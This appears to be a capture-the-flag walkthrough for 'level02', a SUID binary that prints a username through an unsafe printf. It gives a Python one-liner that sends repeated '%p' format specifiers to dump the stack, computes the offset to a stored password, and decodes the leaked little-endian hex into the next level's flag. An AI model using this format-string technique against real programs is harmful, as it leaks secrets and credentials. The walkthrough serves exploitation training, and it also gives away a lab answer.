# Walkthrough - level02

The program has SUID permissions from the user `level03`, which will allow us to obtain their flag.

## Disassembly

- The main stores the content of `/home/users/level03/.pass` in the variable `ptr`
- Username and password are read via `fgets` of 100 bytes
- When entering incorrect password, username is displayed via insecure printf

## Exploit

The arguments of variadic functions (such as `printf`) are passed through the stack and not through registers. This allows us to dump our stack. Note that we are working on a 64-bit architecture so we need to use the format `%p` to display everything correctly.

```bash
(python -c 'print("%p" * 30)'; python -c 'print("A" * 2)') | ./level02
```

We now need to find the variable `ptr` in what we displayed from the stack. The two `A` characters help us find the start of s2 where the password is stored. We know that we need to look `96 + 8 = 104` bytes further to land on the beginning of ptr where the password is stored. Since the `%p` format dumps the stack by 8 bytes, we need to look `104 / 8 = 13` after displaying the `A` characters.

We obtain the following result:

```bash
0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
```

We then need to convert this password to char without forgetting that `%p` has reversed groups of 8 bytes because the system is little-endian, then interpret the values in ASCII to obtain the password.

```
0x756e505234376848 = unPR47hH
0x45414a3561733951 = EAJ5as9Q
0x377a7143574e6758 = 7zqCWNgX
0x354a35686e475873 = 5J5hnGXs
0x48336750664b394d = H3gPfK9M
```

We then only need to invert each groups:

```
unPR47hH => Hh74RPnu
EAJ5as9Q => Q9sa5JAE
7zqCWNgX => XgNWCqz7
5J5hnGXs => sXGnh5J5
H3gPfK9M => M9KfPg3H
```
